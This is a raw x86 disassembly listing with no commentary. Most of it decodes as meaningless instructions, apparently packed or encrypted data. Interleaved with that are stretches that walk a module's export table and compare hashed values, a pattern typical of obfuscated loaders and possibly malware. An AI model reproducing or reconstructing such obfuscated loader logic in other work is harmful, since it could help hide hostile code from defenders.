  40c01e:	cmp    dl,BYTE PTR [esi+0x18]
  40c021:	jmp    0xfd3b:0x3844aed7
  40c028:	jl     0x40c0a6
  40c02a:	std    
  40c02b:	das    
  40c02c:	jmp    0x253f:0xae244c37
  40c033:	jne    0x40c06b
  40c035:	(bad)  
  40c036:	dec    ecx
  40c037:	enter  0x1a52,0x43
  40c03b:	loopne 0x40c0b0
  40c03d:	out    dx,al
  40c03e:	fild   WORD PTR [edx-0x397ded24]
  40c044:	out    0x70,eax
  40c046:	sbb    eax,0xb3c4163b
  40c04b:	(bad)  
  40c04c:	or     BYTE PTR [ecx+0x43126b78],dh
  40c052:	push   eax
  40c053:	frstor [ebx-0x51]
  40c056:	push   cs
  40c057:	es hlt 
  40c059:	and    al,0x14
  40c05b:	dec    ebx
  40c05c:	retf   0x671c
  40c05f:	xchg   DWORD PTR [ebx-0x33f3d5bb],ecx
  40c065:	iret   
  40c066:	cmp    al,0xf8
  40c068:	das    
  40c069:	test   BYTE PTR [esi],dh
  40c06b:	lods   eax,DWORD PTR ds:[esi]
  40c06c:	out    dx,al
  40c06d:	mov    esi,0xfc8d119b
  40c072:	push   ds
  40c073:	retf   
  40c074:	xchg   DWORD PTR ds:0xbf241167,esi
  40c07a:	into   
  40c07b:	int    0x88
  40c07d:	xchg   ebx,eax
  40c07e:	mov    eax,ds:0xec1310c3
  40c083:	sub    eax,0x54b8d9f5
  40c088:	dec    eax
  40c089:	inc    ecx
  40c08a:	xor    DWORD PTR [edi-0x7ac59d19],edx
  40c090:	mov    cl,0x7c
  40c092:	out    0xd6,eax
  40c094:	xchg   ecx,ecx
  40c096:	arpl   WORD PTR [ebx],ax
  40c098:	dec    eax
  40c099:	and    BYTE PTR [ecx+0x430642],ah
  40c09f:	or     eax,DWORD PTR ds:0x42ef0c
  40c0a5:	mov    ds:0x430642,eax
  40c0aa:	mov    DWORD PTR [ebp-0x28],ecx
  40c0ad:	mov    eax,DWORD PTR [ebp-0x14]
  40c0b0:	or     DWORD PTR ds:0x42ef1c,0x6327
  40c0ba:	mov    ecx,DWORD PTR [ebp+0x8]
  40c0bd:	add    ecx,DWORD PTR [eax+0x24]
  40c0c0:	mov    eax,ds:0x43059e
  40c0c5:	xor    eax,DWORD PTR ds:0x42e862
  40c0cb:	mov    ds:0x43059e,eax
  40c0d0:	mov    DWORD PTR [ebp-0x2c],ecx
  40c0d3:	and    DWORD PTR ds:0x4305a6,0x0
  40c0dd:	mov    eax,ds:0x4305a6
  40c0e2:	inc    eax
  40c0e3:	mov    ds:0x4305a6,eax
  40c0e8:	cmp    DWORD PTR ds:0x4305a6,0x1b
  40c0ef:	jne    0x40c11d
  40c0f5:	push   0x4305b2
  40c0fa:	push   0x1519
  40c0ff:	push   DWORD PTR [ebp-0x18]
  40c102:	push   0x42e876
  40c107:	push   DWORD PTR [ebp-0x24]
  40c10a:	push   0x42e9f3
  40c10f:	push   DWORD PTR [ebp-0x24]
  40c112:	push   0x667e
  40c117:	call   DWORD PTR ds:0x42ebf4
  40c11d:	cmp    DWORD PTR ds:0x4305a6,0x14
  40c124:	jb     0x40c0dd
  40c12a:	mov    eax,DWORD PTR [ebp-0x14]
  40c12d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c130:	add    ecx,DWORD PTR [eax+0x1c]
  40c133:	xor    esi,esi
  40c135:	jmp    0x40c293
  40c13a:	xchg   ebp,eax
  40c13b:	leave  
  40c13c:	popa   
  40c13d:	jge    0x40c1bc
  40c13f:	jge    0x40c0ee
  40c141:	fldenv [eax-0x2b]
  40c144:	test   al,0xed
  40c146:	lods   al,BYTE PTR ds:[esi]
  40c147:	stos   WORD PTR es:[edi],ax
  40c149:	push   0x7e7efd32
  40c14e:	aas    
  40c14f:	jg     0x40c1cf
  40c151:	jle    0x40c100
  40c153:	test   BYTE PTR [edi-0x705db518],dh
  40c159:	inc    edi
  40c15a:	repnz lea esi,[edi]
  40c15d:	xchg   esi,eax
  40c15e:	js     0x40c0ea
  40c160:	(bad)  
  40c161:	fistp  QWORD PTR [edx-0x3e6841a2]
  40c167:	push   ebx
  40c168:	das    
  40c169:	mov    edx,0x9a2c238f
  40c16e:	stos   BYTE PTR es:[edi],al
  40c16f:	fist   WORD PTR [esi+0x60cb85b4]
  40c175:	push   esi
  40c176:	inc    eax
  40c177:	mov    eax,ds:0xa822d5e8
  40c17c:	test   al,0xe8
  40c17e:	repz aam 0x9d
  40c181:	fwait
  40c182:	or     DWORD PTR [edx+0x73037691],ebp
  40c188:	scas   al,BYTE PTR es:[edi]
  40c189:	pop    edi
  40c18a:	inc    ecx
  40c18b:	mov    eax,0x334012e1
  40c190:	jmp    0x4d9c:0x775a205d
  40c197:	iret   
  40c198:	fwait
  40c199:	xor    ch,BYTE PTR [ecx]
  40c19b:	dec    edi
  40c19c:	loopne 0x40c1cb
  40c19e:	in     al,dx
  40c19f:	rol    BYTE PTR [eax+0x60],0x98
  40c1a3:	push   es
  40c1a4:	and    cl,BYTE PTR [ebx+0x5954853a]
  40c1aa:	or     BYTE PTR [ecx],dl
  40c1ac:	mov    ah,dl
  40c1ae:	and    eax,0xd45ffcf8
  40c1b3:	in     eax,dx
  40c1b4:	fs in  al,0xef
  40c1b7:	jnp    0x40c183
  40c1b9:	test   DWORD PTR ss:[ecx-0x47],edx
  40c1bd:	mov    ah,0x56
  40c1bf:	int    0x10
  40c1c1:	mov    al,ds:0x2ee3882e
  40c1c6:	cmp    bh,BYTE PTR fs:[edi+edx*4]
  40c1ca:	jae    0x40c169
  40c1cc:	rcl    DWORD PTR ds:0xcab7c035,1
  40c1d2:	mov    bh,0x4f
  40c1d4:	(bad)  
  40c1d5:	push   ss
  40c1d6:	shl    BYTE PTR cs:[ebp-0x55],0x69
  40c1db:	in     al,dx
  40c1dc:	cli    
  40c1dd:	call   0x230441e1
  40c1e2:	ins    DWORD PTR es:[edi],dx
  40c1e3:	dec    ebx
  40c1e4:	mov    BYTE PTR [edi+0x2a],bh
  40c1e7:	inc    ebx
  40c1e8:	push   0x5a2c45e4
  40c1ed:	int3   
  40c1ee:	ja     0x40c19d
  40c1f0:	(bad)  
  40c1f1:	aam    0x38
  40c1f3:	xor    eax,0xc9d5e697
  40c1f8:	xchg   edi,eax
  40c1f9:	adc    eax,0x695f7d3c
  40c1fe:	mov    ebp,0x400739c
  40c203:	xchg   ebx,eax
  40c204:	xchg   edx,eax
  40c205:	dec    edi
  40c206:	scas   al,BYTE PTR es:[edi]
  40c207:	cmp    DWORD PTR [edi+0x722907c],0x6b9f60e5
  40c211:	inc    ebp
  40c212:	cld    
  40c213:	cmp    ebp,DWORD PTR [ecx]
  40c215:	call   0xfec49ba8
  40c21a:	and    eax,0x29198f65
  40c21f:	dec    edx
  40c220:	pop    ecx
  40c221:	xor    bh,ah
  40c223:	ret    0xb38e
  40c226:	jecxz  0x40c1ed
  40c228:	mov    dh,0x4
  40c22a:	cmp    BYTE PTR [esp+edx*4-0x27614aa0],ah
  40c231:	jg     0x40c254
  40c233:	cwde   
  40c234:	inc    eax
  40c235:	out    dx,al
  40c236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c237:	ss dec ecx
  40c239:	dec    ecx
  40c23a:	mov    ch,0xd4
  40c23c:	xchg   edx,eax
  40c23d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c23e:	pop    ebx
  40c23f:	push   ds
  40c240:	jp     0x40c246
  40c242:	mov    DWORD PTR [edi+0x5e993813],esi
  40c248:	idiv   cl
  40c24a:	pop    ebp
  40c24b:	cmp    eax,0x5e6ce304
  40c250:	xor    ebx,DWORD PTR fs:[edx]
  40c253:	sub    eax,0x15254880
  40c258:	xor    DWORD PTR [ebp-0x60],edi
  40c25b:	jmp    0x40c27e
  40c25d:	mov    ds:0x51e8d944,al
  40c262:	in     eax,dx
  40c263:	dec    ecx
  40c264:	push   esi
  40c265:	jge    0x40c25f
  40c267:	test   DWORD PTR [eax],esi
  40c269:	aad    0xc4
  40c26b:	pop    esp
  40c26c:	popf   
  40c26d:	and    esp,DWORD PTR [ebx-0x21e300ad]
  40c273:	int    0xf7
  40c275:	dec    edx
  40c276:	sub    BYTE PTR [edi-0x44],ch
  40c279:	add    al,0x31
  40c27b:	or     BYTE PTR [edi-0x133063ad],ch
  40c281:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c282:	xchg   BYTE PTR [edx-0x68],ch
  40c285:	pop    edi
  40c286:	add    DWORD PTR [eax],ecx
  40c288:	inc    ebp
  40c289:	mov    eax,ds:0x1465e8eb
  40c28e:	retf   
  40c28f:	outs   dx,BYTE PTR ds:[esi]
  40c290:	mov    edi,0x4d890f3f
  40c295:	in     al,dx
  40c296:	mov    eax,DWORD PTR [ebp-0x28]
  40c299:	mov    ecx,DWORD PTR [ebp+0x8]
  40c29c:	add    ecx,DWORD PTR [eax+edi*4]
  40c29f:	jmp    0x40c3fd
  40c2a4:	lea    edx,[esi-0x1a42cd67]
  40c2aa:	pop    ebp
  40c2ab:	imul   edx,DWORD PTR ds:0x4fe92bcc,0xf335fd11
  40c2b5:	(bad)  
  40c2b6:	jle    0x40c336
  40c2b8:	aas    
  40c2b9:	jg     0x40c339
  40c2bb:	jle    0x40c2d1
  40c2bd:	xchg   BYTE PTR [esi-0x7f793d7a],al
  40c2c3:	push   esi
  40c2c4:	xchg   ah,bl
  40c2c6:	xchg   ebx,eax
  40c2c7:	ret    
  40c2c8:	mov    ds:0xb0da655,eax
  40c2cd:	(bad)  
  40c2d0:	aam    0xbb
  40c2d2:	xchg   ebx,eax
  40c2d3:	mov    esp,0x4b1751fd
  40c2d8:	stc    
  40c2d9:	jecxz  0x40c2b5
  40c2db:	jle    0x40c2c5
  40c2dd:	mov    ebx,0xd4f56e40
  40c2e2:	ja     0x40c28d
  40c2e4:	push   esi
  40c2e5:	rcr    ch,cl
  40c2e7:	add    al,0x28
  40c2e9:	mov    DWORD PTR [ebp+0x69793a17],ebp
  40c2ef:	mov    ch,0x9
  40c2f1:	push   edi
  40c2f2:	dec    eax
  40c2f3:	rcl    BYTE PTR [edx],0x29
  40c2f6:	stos   DWORD PTR es:[edi],eax
  40c2f7:	repnz arpl WORD PTR [edx-0x3f],bp
  40c2fb:	sbb    eax,0x9cdc2f3a
  40c300:	and    eax,0xafa8c13b
  40c305:	mov    ah,0x7
  40c307:	mov    dl,BYTE PTR [ebp-0x4c]
  40c30a:	xor    al,0x75
  40c30c:	jl     0x40c32e
  40c30e:	push   ecx
  40c30f:	mov    dh,0x3b
  40c311:	mov    edx,db4
  40c314:	mov    esp,0xfbdddbba
  40c319:	mov    eax,0x2e5edb44
  40c31e:	mov    DWORD PTR [esi-0x45],ecx
  40c321:	jp     0x40c357
  40c323:	pop    ds
  40c324:	xlat   BYTE PTR ds:[ebx]
  40c325:	test   DWORD PTR [esi-0x3a17cb25],ebp
  40c32b:	imul   edi,DWORD PTR [eax*4-0x21aae9df],0x2f228b27
  40c336:	jb     0x40c33b
  40c338:	mov    ds,WORD PTR [ecx]
  40c33a:	inc    ebx
  40c33b:	lock pusha 
  40c33d:	push   ebx
  40c33e:	ins    BYTE PTR es:[edi],dx
  40c33f:	js     0x40c384
  40c341:	(bad)  
  40c342:	cmc    
  40c343:	sub    BYTE PTR [esi-0x39e8b5c4],ah
  40c349:	mov    sp,0x662f
  40c34d:	sbb    al,0x5c
  40c34f:	and    edx,DWORD PTR [ebx+0x24]
  40c352:	push   0x2822683f
  40c357:	pusha  
  40c358:	pop    es
  40c359:	dec    edx
  40c35a:	imul   edx,DWORD PTR [edx-0x60],0xacff2b4a
  40c361:	ins    DWORD PTR es:[edi],dx
  40c362:	bound  edi,QWORD PTR [ecx]
  40c364:	mov    edx,0x29cf2e85
  40c369:	lock jmp 0x40c3a0
  40c36c:	cmp    eax,0xad3049b4
  40c371:	or     ecx,DWORD PTR [ebx]
  40c373:	or     al,0xb8
  40c375:	inc    eax
  40c376:	stc    
  40c377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c378:	lahf   
  40c379:	std    
  40c37a:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  40c37c:	cmc    
  40c37d:	jae    0x40c361
  40c37f:	(bad)  
  40c380:	popa   
  40c381:	ror    DWORD PTR [esp+eiz*2+0x407e16f5],1
  40c388:	lock adc DWORD PTR [eax],ebp
  40c38b:	aas    
  40c38c:	fnstenv [edi+0x45ee6196]
  40c392:	inc    edx
  40c393:	and    eax,0x6dae8ad3
  40c398:	ret    0x4758
  40c39b:	fucomi st,st(5)
  40c39e:	cmp    eax,0xf519c565
  40c3a3:	jp     0x40c3cf
  40c3a5:	popa   
  40c3a6:	pop    edi
  40c3a7:	addr16 out dx,eax
  40c3a9:	xchg   ecx,eax
  40c3aa:	xchg   esp,eax
  40c3ab:	and    BYTE PTR [ebx+0x64911d9a],dl
  40c3b1:	iret   
  40c3b2:	inc    edi
  40c3b3:	mov    edx,DWORD PTR [edx]
  40c3b5:	inc    edx
  40c3b6:	enter  0xd77,0xbb
  40c3ba:	mov    BYTE PTR [eax+ebp*1+0x80563d5],dl
  40c3c1:	xchg   edi,eax
  40c3c2:	pop    esi
  40c3c3:	or     eax,0xb6d41fb
  40c3c8:	fnstenv [edi+0x8cb4cdd]
  40c3ce:	mov    ecx,0x847d9221
  40c3d3:	clc    
  40c3d4:	aad    0x19
  40c3d6:	jae    0x40c41e
  40c3d8:	mov    esp,gs
  40c3da:	xchg   edi,eax
  40c3db:	popf   
  40c3dc:	data16 and BYTE PTR [edx-0x6cb44198],bl
  40c3e3:	and    esp,DWORD PTR [edx]
  40c3e5:	pop    esi
  40c3e6:	fdivr  st(5),st
  40c3e8:	sbb    cl,BYTE PTR [esi-0x7f]
  40c3eb:	and    edi,DWORD PTR [ebp+0x53]
  40c3ee:	mov    bl,0x9c
  40c3f0:	or     BYTE PTR [edi],ch
  40c3f2:	gs mov eax,0x6ff31d17
  40c3f8:	int    0xae
  40c3fa:	add    edi,DWORD PTR [edi-0x7ba721e]
  40c400:	jmp    0x40c55e
  40c405:	and    DWORD PTR [edx-0x5462d589],ebp
  40c40b:	and    eax,0xb3c66ebd
  40c410:	sti    
  40c411:	out    dx,al
  40c412:	call   0xfff56932
  40c417:	jle    0x40c497
  40c419:	aas    
  40c41a:	jg     0x40c49a
  40c41c:	jle    0x40c429
  40c41e:	jno    0x40c3be
  40c420:	xchg   DWORD PTR [edx+eax*4],ebx
  40c423:	or     esi,ecx
  40c425:	jns    0x40c41e
  40c427:	scas   eax,DWORD PTR es:[edi]
  40c428:	or     edi,DWORD PTR [ebx-0x3]
  40c42b:	mov    edx,0xfc1e8e20
  40c430:	mov    esp,0xfd25d4ff
  40c435:	xchg   BYTE PTR [edx+0x3c],bh
  40c438:	bound  eax,QWORD PTR [edx-0x1f9cf8ff]
  40c43e:	cmp    esi,DWORD PTR [edi-0x2aa707a3]
  40c444:	mov    edi,0x6cd6e5c0
  40c449:	clc    
  40c44a:	mov    eax,ds:0xd99ff7cd
  40c44f:	or     DWORD PTR [ecx-0x5c],edx
  40c452:	popa   
  40c453:	adc    eax,0x9a54ab10
  40c458:	xchg   edi,eax
  40c459:	xor    eax,esp
  40c45b:	cmp    al,0x64
  40c45d:	shl    BYTE PTR [ebx],1
  40c45f:	jmp    0xac168b0f
  40c464:	rcr    bh,1
  40c466:	dec    ebx
  40c467:	xchg   esi,eax
  40c468:	loop   0x40c464
  40c46a:	or     bh,BYTE PTR [ecx+0x33]
  40c46d:	xchg   edi,eax
  40c46e:	jg     0x40c462
  40c470:	and    al,dl
  40c472:	and    esi,DWORD PTR [ebp+ecx*1-0x27]
  40c476:	(bad)  
  40c477:	pop    ds
  40c478:	in     al,dx
  40c479:	push   eax
  40c47a:	cmp    dh,ah
  40c47c:	shl    DWORD PTR [edx-0x49],1
  40c47f:	(bad)  
  40c480:	repnz dec edi
  40c482:	or     eax,0x870186d0
  40c487:	imul   edx,DWORD PTR [eax-0x1b385a52],0xc7e868f5
  40c491:	(bad)  
  40c493:	mov    ds:0x442d14ee,al
  40c498:	gs cmc 
  40c49a:	into   
  40c49b:	test   DWORD PTR [esi-0x2cd9703f],ebp
  40c4a1:	xor    al,0xd0
  40c4a3:	cmc    
  40c4a4:	dec    esi
  40c4a5:	mov    DWORD PTR [edi+0x53c959bd],0x118363e8
  40c4af:	outs   dx,DWORD PTR ds:[esi]
  40c4b0:	mov    bl,0xda
  40c4b2:	cld    
  40c4b3:	pushf  
  40c4b4:	aas    
  40c4b5:	fsubr  QWORD PTR [edx+edi*1+0x5e77d7eb]
  40c4bc:	aaa    
  40c4bd:	imul   ecx,edx,0xffffffd2
  40c4c0:	xchg   ebp,eax
  40c4c1:	cmc    
  40c4c2:	(bad)  
  40c4c3:	xchg   ecx,eax
  40c4c4:	mov    ah,0x8b
  40c4c6:	add    edx,ecx
  40c4c8:	mov    esi,0x7fcc7d2f
  40c4cd:	daa    
  40c4ce:	xchg   ebp,eax
  40c4cf:	enter  0x5c72,0xc
  40c4d3:	test   cl,ah
  40c4d5:	dec    dh
  40c4d7:	pop    esi
  40c4d8:	clc    
  40c4d9:	jmp    0x5835:0xa87de808
  40c4e0:	js     0x40c4df
  40c4e2:	push   esi
  40c4e3:	or     edi,DWORD PTR [ecx]
  40c4e5:	mov    cl,0x8d
  40c4e7:	xor    al,0x7e
  40c4e9:	jmp    0xd6dc5320
  40c4ee:	lock jb 0x40c525
  40c4f1:	mov    ebp,0xc193d2d8
  40c4f6:	mov    ds:0x71d7f28e,al
  40c4fb:	mov    eax,ds:0x4730c72f
  40c500:	push   ss
  40c501:	call   0xe26a9acb
  40c506:	lock data16 adc al,0x26
  40c50a:	mov    edx,0xaf220769
  40c50f:	mov    gs,esi
  40c511:	xor    ebx,DWORD PTR [ebx+0x65]
  40c514:	into   
  40c515:	dec    esp
  40c516:	jne    0x40c577
  40c518:	fidiv  DWORD PTR [eax]
  40c51a:	lock push esi
  40c51c:	mov    BYTE PTR [ecx],ah
  40c51e:	stc    
  40c51f:	adc    al,0xd1
  40c521:	pop    ss
  40c522:	sbb    DWORD PTR [edi],ebx
  40c524:	sub    edi,DWORD PTR [ebx-0x2e]
  40c527:	add    al,0xcd
  40c529:	cld    
  40c52a:	xor    ch,BYTE PTR [eax+0x55cac5d9]
  40c530:	inc    edx
  40c531:	js     0x40c534
  40c533:	mov    dl,BYTE PTR [ebp-0x28620992]
  40c539:	push   esp
  40c53a:	add    eax,0xdda1997c
  40c53f:	jg     0x40c560
  40c541:	or     ebx,ebx
  40c543:	dec    eax
  40c544:	push   0x17d8cb36
  40c549:	or     ah,BYTE PTR [esp+ebx*2-0x28b24404]
  40c550:	adc    BYTE PTR [ebx+edi*8],dh
  40c553:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c555:	or     DWORD PTR [ecx-0x581815f7],0x896e9c15
  40c55f:	dec    ebp
  40c560:	rcl    BYTE PTR [eax-0x1],1
  40c563:	jne    0x40c535
  40c565:	push   DWORD PTR [ebp+0xc]
  40c568:	call   0x406fc8
  40c56d:	mov    eax,DWORD PTR [ebp-0x4]
  40c570:	jmp    0x40c6ce
  40c575:	push   esi
  40c576:	sahf   
  40c577:	sbb    al,0x64
  40c579:	fdivr  QWORD PTR [esi+edx*2-0x44]
  40c57d:	or     esi,DWORD PTR [esi-0x27]
  40c580:	cmp    eax,0xd8f88de6
  40c585:	jne    0x40c578
  40c587:	jle    0x40c607
  40c589:	aas    
  40c58a:	jg     0x40c60a
  40c58c:	jle    0x40c5e5
  40c58e:	push   ebx
  40c58f:	push   ds
  40c590:	je     0x40c55b
  40c592:	mov    edi,0x7d359481
  40c597:	push   es
  40c598:	and    BYTE PTR [ebp+eax*8-0x3e],0x28
  40c59d:	add    al,0x5f
  40c59f:	test   al,0x1c
  40c5a1:	mov    WORD PTR [eax+0x62],fs
  40c5a4:	add    bh,BYTE PTR [ecx]
  40c5a6:	fnsave [eax]
  40c5a8:	sbb    ecx,DWORD PTR [edx+0x0]
  40c5ab:	pop    esi
  40c5ac:	push   0x791533c8
  40c5b1:	outs   dx,BYTE PTR ds:[esi]
  40c5b2:	and    BYTE PTR [edi-0x7c],dh
  40c5b5:	xor    eax,0xfd3ca821
  40c5ba:	je     0x40c591
  40c5bc:	cwde   
  40c5bd:	jnp    0x40c553
  40c5bf:	stos   BYTE PTR es:[edi],al
  40c5c0:	(bad)  
  40c5c1:	dec    edx
  40c5c2:	pop    ecx
  40c5c3:	mov    ds:0xc426bc40,al
  40c5c8:	pop    esi
  40c5c9:	aam    0x42
  40c5cb:	(bad)  
  40c5cc:	jle    0x40c55d
  40c5ce:	xlat   BYTE PTR ds:[ebx]
  40c5cf:	mov    ds,esi
  40c5d1:	ja     0x40c611
  40c5d3:	sub    eax,0x7b8109ab
  40c5d8:	mov    ecx,0x48c8796c
  40c5dd:	xchg   esi,eax
  40c5de:	aad    0x8a
  40c5e0:	adc    eax,0xe6b167f4
  40c5e5:	aam    0xea
  40c5e7:	push   edi
  40c5e8:	imul   edx,DWORD PTR [edi+esi*1],0x47
  40c5ec:	add    DWORD PTR [edx+0xae847fb],0x5a75f653
  40c5f6:	popa   
  40c5f7:	sub    ecx,DWORD PTR [edi-0x15c33a7e]
  40c5fd:	pusha  
  40c5fe:	xchg   edi,eax
  40c5ff:	mov    eax,fs
  40c601:	pop    ebx
  40c602:	mov    ecx,0x1cc348b9
  40c607:	neg    BYTE PTR [ecx+0x78]
  40c60a:	push   esi
  40c60b:	scas   al,BYTE PTR es:[edi]
  40c60c:	fistp  DWORD PTR [edx+ecx*8+0x287747d2]
  40c613:	ds ds jb 0x40c61c
  40c617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c618:	aad    0x47
  40c61a:	xchg   esp,eax
  40c61b:	fyl2x  
  40c61d:	cmc    
  40c61e:	pop    ebx
  40c61f:	sbb    al,BYTE PTR [ebp+edi*2-0x4b]
  40c623:	jecxz  0x40c5f4
  40c625:	add    BYTE PTR [edi+ecx*2],bh
  40c628:	sysret 
  40c62a:	ret    0xd384
  40c62d:	lds    esi,FWORD PTR [edx-0x2c4020d8]
  40c633:	push   ss
  40c634:	jo     0x40c608
  40c636:	mov    dl,0xc9
  40c638:	pusha  
  40c639:	mov    eax,ds:0x8d99dc42
  40c63e:	pop    ds
  40c63f:	xchg   ebp,eax
  40c640:	jl     0x40c666
  40c642:	mov    esp,0x583eaa47
  40c648:	enter  0xf8ee,0xd
  40c64c:	test   BYTE PTR [ebp+0x32],dl
  40c64f:	loope  0x40c6b5
  40c651:	fisttp DWORD PTR [esi-0x6b]
  40c654:	jecxz  0x40c6d1
  40c656:	fsubp  st(7),st
  40c658:	add    ebp,edx
  40c65a:	call   0xc04af051
  40c65f:	push   edx
  40c660:	cmp    DWORD PTR [edi+0xd],esp
  40c663:	mov    esi,DWORD PTR [eax-0x7d]
  40c666:	clc    
  40c667:	aam    0x6a
  40c669:	int    0x12
  40c66b:	sbb    al,0xab
  40c66d:	fdiv   DWORD PTR [ecx+ecx*2-0x12]
  40c671:	sbb    ebx,DWORD PTR [ebx]
  40c673:	mov    dh,0x6b
  40c675:	mov    dh,bl
  40c677:	addr16 push edx
  40c679:	pop    ss
  40c67a:	mov    eax,0xad322711
  40c67f:	aas    
  40c680:	dec    eax
  40c681:	(bad)  
  40c682:	popf   
  40c683:	xchg   BYTE PTR [ecx-0x2c],ah
  40c686:	sbb    ch,dl
  40c688:	inc    esp
  40c689:	(bad)  
  40c68b:	inc    edi
  40c68c:	ss hlt 
  40c68e:	pop    esi
  40c68f:	mov    al,0x85
  40c691:	scas   eax,DWORD PTR es:[edi]
  40c692:	inc    esi
  40c693:	add    BYTE PTR [edx-0x54],ch
  40c696:	mov    BYTE PTR [ecx],cl
  40c698:	push   ebx
  40c699:	mov    al,ds:0x1b804e24
  40c69e:	xchg   ecx,eax
  40c69f:	ins    BYTE PTR es:[edi],dx
  40c6a0:	mov    ch,0x94
  40c6a2:	arpl   bx,bx
  40c6a4:	rcr    BYTE PTR [ebp-0x1],cl
  40c6a7:	dec    eax
  40c6a8:	ror    BYTE PTR ds:0xbdf1f221,0x7
  40c6af:	aam    0x80
  40c6b1:	inc    esp
  40c6b2:	imul   esi,DWORD PTR [esp+ecx*2-0x19c37fbb],0x2c
  40c6ba:	call   0xa9c9:0xd4056f43
  40c6c1:	gs push 0x37
  40c6c4:	(bad)  
  40c6c5:	mov    al,0xfa
  40c6c7:	and    esi,edx
  40c6c9:	adc    al,0x95
  40c6cb:	out    dx,eax
  40c6cc:	jne    0x40c6ac
  40c6ce:	mov    ecx,DWORD PTR [ebp-0x8]
  40c6d1:	xor    eax,0x7510856
  40c6d6:	add    eax,ebx
  40c6d8:	cmp    ecx,eax
  40c6da:	jne    0x40c6fd
  40c6e0:	mov    eax,DWORD PTR [ebp-0x20]
  40c6e3:	inc    edi
  40c6e4:	cmp    edi,eax
  40c6e6:	jb     0x40b937
  40c6ec:	jmp    0x40c70d
  40c6f1:	mov    eax,DWORD PTR [ebp-0x4]
  40c6f4:	xor    eax,esi
  40c6f6:	add    eax,ebx
  40c6f8:	jmp    0x40e0f7
  40c6fd:	mov    eax,DWORD PTR [ebp-0x2c]
  40c700:	movzx  eax,WORD PTR [eax+edi*2]
  40c704:	mov    ecx,DWORD PTR [ebp-0x14]
  40c707:	mov    eax,DWORD PTR [ecx+eax*4]
  40c70a:	mov    DWORD PTR [ebp+0xc],eax
  40c70d:	mov    eax,DWORD PTR [ebp-0x4]
  40c710:	mov    ecx,DWORD PTR [ebp-0x8]
  40c713:	xor    eax,0x7510856
  40c718:	add    eax,ebx
  40c71a:	cmp    ecx,eax
  40c71c:	jne    0x40c88d
  40c722:	mov    eax,DWORD PTR [ebp-0x4]
  40c725:	xor    eax,0x7510856
  40c72a:	jmp    0x40c6f6
  40c72f:	jmp    0x40c88d
  40c734:	pop    eax
  40c735:	mov    WORD PTR ds:0x5da1fd90,?
  40c73b:	jl     0x40c715
  40c73d:	xchg   ecx,eax
  40c73e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c740:	xor    DWORD PTR ds:0xf236f9b5,esp
  40c746:	jle    0x40c7c6
  40c748:	aas    
  40c749:	jg     0x40c7c9
  40c74b:	jle    0x40c743
  40c74d:	test   ebx,edi
  40c74f:	int3   
  40c750:	pop    esi
  40c751:	je     0x40c78e
  40c753:	retf   
  40c754:	ret    0x9265
  40c757:	ins    DWORD PTR es:[edi],dx
  40c758:	pop    edi
  40c759:	mov    WORD PTR [edi-0x5e282c81],?
  40c75f:	jmp    0xbfdc:0xcec3b273
  40c766:	cwde   
  40c767:	cmc    
  40c768:	add    BYTE PTR [ecx-0x6e389de5],0x26
  40c76f:	jge    0x40c70e
  40c771:	mov    al,ds:0x8cfd98e5
  40c776:	adc    ebp,esi
  40c778:	aam    0xb9
  40c77a:	cmc    
  40c77b:	pop    ds
  40c77c:	test   bl,ah
  40c77e:	out    0x95,al
  40c780:	mov    ebp,0x88044e47
  40c785:	call   0x1dc981d9
  40c78a:	mov    ecx,0x85a1f437
  40c78f:	mov    dl,0xf2
  40c791:	sti    
  40c792:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c793:	out    dx,al
  40c794:	fidivr WORD PTR gs:[esi-0x3e]
  40c798:	cli    
  40c799:	pop    es
  40c79a:	fdivr  DWORD PTR [ebx]
  40c79c:	adc    BYTE PTR [ebp-0x182beaa7],bh
  40c7a2:	scas   eax,DWORD PTR es:[edi]
  40c7a3:	test   DWORD PTR [esi],0xa1bb82b
  40c7a9:	dec    DWORD PTR [edi-0x27]
  40c7ac:	and    al,BYTE PTR [eax-0x44]
  40c7af:	in     al,dx
  40c7b0:	xchg   ebp,eax
  40c7b1:	push   0x7d06580a
  40c7b6:	dec    ebx
  40c7b7:	test   DWORD PTR [esi],esi
  40c7b9:	pop    ebp
  40c7ba:	ret    0x6a1d
  40c7bd:	mul    BYTE PTR [esi]
  40c7bf:	xchg   ebx,eax
  40c7c0:	dec    BYTE PTR [esi+0x4]
  40c7c3:	fcmovnbe st,st(1)
  40c7c5:	cld    
  40c7c6:	fst    QWORD PTR [edx-0x47]
  40c7c9:	sbb    eax,0xb6d02bf2
  40c7ce:	(bad)  
  40c7cf:	adc    eax,DWORD PTR [ebx+0x78d586e1]
  40c7d5:	mov    WORD PTR [edi-0x15],es
  40c7d8:	in     eax,0xa7
  40c7da:	out    dx,al
  40c7db:	mov    ds:0xb225fe24,eax
  40c7e0:	std    
  40c7e1:	gs jbe 0x40c828
  40c7e4:	or     BYTE PTR [esp+eiz*2+0x7d],ch
  40c7e8:	adc    eax,0x44598ef0
  40c7ed:	stos   DWORD PTR es:[edi],eax
  40c7ee:	add    edi,DWORD PTR ds:0xbdae18c6
  40c7f4:	sub    DWORD PTR [esi+0x2f],eax
  40c7f7:	bound  eax,QWORD PTR [esi-0x6789f4d6]
  40c7fd:	out    dx,eax
  40c7fe:	cmp    BYTE PTR [edx-0x1b],ah
  40c801:	mov    ah,0x87
  40c803:	jmp    0x40c787
  40c805:	sub    al,0xea
  40c807:	xor    eax,0x717e4526
  40c80c:	out    dx,eax
  40c80d:	ret    
  40c80e:	pop    di
  40c810:	cld    
  40c811:	int    0xf0
  40c813:	dec    edx
  40c814:	xchg   ebp,eax
  40c815:	pop    ebx
  40c816:	sahf   
  40c817:	mov    edi,0xe1dd5609
  40c81c:	sub    al,0x9f
  40c81e:	into   
  40c81f:	repnz pop ebx
  40c821:	mov    al,0x7c
  40c823:	inc    esi
  40c824:	adc    al,0xa5
  40c826:	popf   
  40c827:	sbb    ebx,DWORD PTR [edi+eax*1-0x4e08e9b0]
